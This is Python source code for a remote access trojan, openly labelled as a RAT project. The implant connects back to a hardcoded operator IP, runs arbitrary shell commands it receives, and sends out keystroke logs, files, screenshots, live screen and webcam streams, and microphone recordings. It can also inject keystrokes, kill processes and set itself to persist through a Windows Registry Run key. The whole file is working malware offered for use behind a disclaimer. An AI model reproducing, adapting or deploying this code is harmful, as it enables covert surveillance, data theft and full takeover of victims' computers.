# Python RAT project by average-joe44
# Does NOT Responsible for any use case!

import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
import threading
from Logger import Keylogger
import cv2
import pickle
import struct
import pyautogui
import shutil
import pyaudio 
from pynput.keyboard import Key, Controller
from mss import mss
import numpy as np
from filetarget import download_file, upload_file

sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '192.168.18.198'
main_log1 = threading.Event()

def start_log():
    Keylogger().start_log()
    main_log1.set()

def baca_log():
    if not main_log1.is_set():
        return

    open()

def stop_log():
    Keylogger().stop_listener()

def open():
    sok.sendall(Keylogger().baca_log().encode())

def change_directory(cmd):
    try:
        os.chdir(cmd)
        cur_dir = os.getcwd()
        sok.sendall(f"{cur_dir}".encode())
    except:
        sok.sendall("Can't change directory".encode())
        pass

def screen_shot():
    ss = pyautogui.screenshot()
    ss.save('ss.png')
    upload_file(sok,'ss.png')
    os.remove("ss.png")

def execute(cmd):
    if shutil.which(cmd):
        os.system(f"start {cmd}")
    else:
        pass

def kill(cmd):
    if shutil.which(cmd):
        os.system(f"taskkill /IM {cmd} /F")
    else:
        pass

def pidkill(cmd):
    try:
        os.system(f"taskkill /PID {cmd} /F")
    except:
        return

def send_camera_image(ip, port=9999):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        return

    _, img_encoded = cv2.imencode(".jpg", frame)
    data = img_encoded.tobytes()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))

    client.sendall(struct.pack("!I", len(data)))
    client.sendall(data)

    client.close()

keyb = Controller()
def acc_keystroke():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 9995))
        while True:
            data = s.recv(1024)
            if not data:
                break
            command = data.decode()
            try:
                if command.lower() == 'enter':
                    keyb.press(Key.enter)
                    keyb.release(Key.enter)
                if command.lower() == 'space':
                    keyb.press(Key.space)
                    keyb.release(Key.space)
                else:
                    keyb.type(command)
            except Exception as e:
                print(f'{e}')
                break
            

FORMAT = pyaudio.paInt16
CHANNEL = 1
RATE = 44100
CHUNK = 1024

def record_n_send():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNEL,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    print('Recording')
    frame = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, 9996))
            for _ in range(0, int(RATE / CHUNK * 20)):
                data = stream.read(CHUNK)
                s.sendall(data)
            print('Record done')
    except socket.error as e:
        print(f'{e}')
    finally:
        print('done')
        stream.stop_stream()
        stream.close()
        audio.terminate()

def  execute_persistence(nama_registry, file_exe):
    file_path = os.environ['appdata']+'\\'+file_exe
    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
        else:
            pass
    except:
        pass
    
def send_screen_record(ip, port=9991):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    
    sct = mss()
    monitor = sct.monitors[1]

    while True:
        try:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)

            data = pickle.dumps(frame)
            size = struct.pack("Q", len(data))
            client.sendall(size + data)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        except Exception as e:
            print(f'{e}')
            break

    client.close()
    cv2.destroyAllWindows()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, 9998))
        vid = cv2.VideoCapture(0)
        while vid.isOpened:
            img, frame = vid.read()
            if not img:
                break
            try:
                b = pickle.dumps(frame)
                message = struct.pack("Q", len(b))+b
                sock.sendall(message)
            except (BrokenPipeError, ConnectionResetError, OSError):
                break
    except Exception:
            pass
    finally:
        try: sock.close()
        except: pass
    vid.release()
    cv2.destroyAllWindows()

def terima_perintah():
    data = ''
    while True:
        try:
            data = data + sok.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except socket.timeout:
            continue

def jalankan_perintah():
    while True:
        perintah = terima_perintah()
        if perintah in ('exit', 'quit'):
            break
        if perintah == 'clear':
            pass
        elif perintah[:3] == 'cd ':
            change_directory(perintah[3:])
        elif perintah[:8] == 'download':
            upload_file(sok, perintah[9:])
        elif perintah[:6] == 'upload':
            download_file(sok, perintah[7:])
        elif perintah == 'start_log':
            start_log()
        elif perintah == 'baca_log':
            baca_log()
        elif perintah == 'stop_log':
            stop_log()
            stop_log()
            main_log1.clear()
        elif perintah == 'start_cam':
            byte_stream()
        elif perintah == 'screen_shot':
            screen_shot()
        elif perintah == 'screen_share':
            send_screen_record(ip=ip, port=9991)
        elif perintah[:11] == 'persistence':
            nama_registry, file_exe = perintah[12:].split(' ')
            execute_persistence(nama_registry, file_exe)
        elif perintah == 'help':
            pass
        elif perintah == 'rec_audio':
            record_n_send()
        elif perintah == 'send_key':
            acc_keystroke()
        elif perintah == 'snap_cam':
            send_camera_image(ip=ip, port=9993)
        elif perintah[:7] == 'execute':
            execute(perintah[8:])
        elif perintah[:4] == 'kill':
            kill(perintah[5:])
        elif perintah[:7] == 'pidkill':
            pidkill(perintah[8:])
        else:
            exe = subprocess.Popen(
            perintah,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE
        )
            data =exe.stdout.read() + exe.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sok.send(output.encode())

def execute_persist():
    while True:
        try:
            time.sleep(3)
            sok.connect((ip, 9999))
            jalankan_perintah()
            sok.close()
            break
        except:
            execute_persist()

execute_persist()
